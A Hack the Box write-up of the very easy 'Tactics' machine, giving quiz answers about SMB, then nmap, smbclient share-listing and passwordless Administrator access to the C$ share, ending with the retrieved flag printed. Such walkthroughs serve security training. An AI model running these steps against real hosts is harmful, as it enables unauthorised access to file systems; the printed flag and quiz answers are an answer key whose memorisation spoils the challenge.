# Tactics
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Tactics
* Topic: [[SMB]]
* Difficulty: Very easy
* Date: 17-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. Which Nmap switch can we use to enumerate machines when our packets are otherwise blocked by the Windows firewall? 
 - **-Pn**
2. What does the 3-letter acronym SMB stand for? 
- **server message block**
3. What port does SMB use to operate at? 
- **445**
4. What command line argument do you give to `smbclient` to list available shares? 
- **-L**
5. What character at the end of a share name indicates it's an administrative share? 
- **$**
6. Which Administrative share is accessible on the box that allows users to view the whole file system? 
- **C$**
7. What command can we use to download the files we find on the SMB Share?
- **get**
8. Which tool that is part of the Impacket collection can be used to get an interactive shell on the system? 
- **PSexec.py**

---
## Flag:
Nmap:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV -Pn 10.129.77.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-17 09:56 EDT
Nmap scan report for 10.129.77.1
Host is up (0.066s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-17T13:56:59
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 59.12 seconds
```

It's running SMB on port 445. We can use `smbclient` to list the shares. If the Administrator user on the host is configured without a password, we should be able to log on without any problems.

Command:

`smbclient -L 10.129.229.124 -U Administrator`

`-L`: List the shars on host.

`-U`: Log on as user, in this case Administrator.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -L 10.129.77.1 -U Administrator 
Enter WORKGROUP\Administrator's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.77.1 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

If we connect to `C$` we can get access to the file sysem on the host.

 `smblient \\\\10.129.229.124\\C$ -U Administrator`
 
`\\\\`: Equals to "\\\\" when interpreted, means root of directory.

`\\`: Equals to "\\" when interpreted, means new directory level.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\10.129.77.1\\C$ -U Administrator
Enter WORKGROUP\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Sun Apr 17 09:51:08 2022
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Wed Apr 21 11:31:48 2021
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul  7 14:05:23 2021

                3774463 blocks of size 4096. 1158911 blocks available
```

Let's get the flag.

```console
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 03:16:03 2021
  ..                                 DR        0  Thu Apr 22 03:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021

                3774463 blocks of size 4096. 1158895 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit
       
┌──(kali㉿kali)-[~/Downloads]
└─$ cat flag.txt             
f751c19eda8f61ce81827e6930a1f40c
```

**Flag:** `f751c19eda8f61ce81827e6930a1f40c`

---
**Tags:** [[HackTheBox]]